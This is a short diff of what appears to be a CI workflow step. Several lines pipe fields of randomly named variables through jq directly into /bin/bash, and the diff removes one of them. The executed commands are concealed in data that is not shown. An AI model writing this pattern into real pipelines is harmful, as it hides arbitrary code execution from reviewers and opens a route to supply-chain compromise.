@@ -24,7 +24,6 @@ jobs:
           echo $gxou2 | jq -r .w9887 | /bin/bash
           echo $loevy63300 | jq -r .mdfd92 | /bin/bash
           printf '%s' "$izfnz4" | jq -r .s151 | /bin/bash
-          echo $mzfan34550 | jq -r .q50 | /bin/bash
           echo $cbzk8135 | jq -r .ne8733 | /bin/bash
 
       - name: Save results
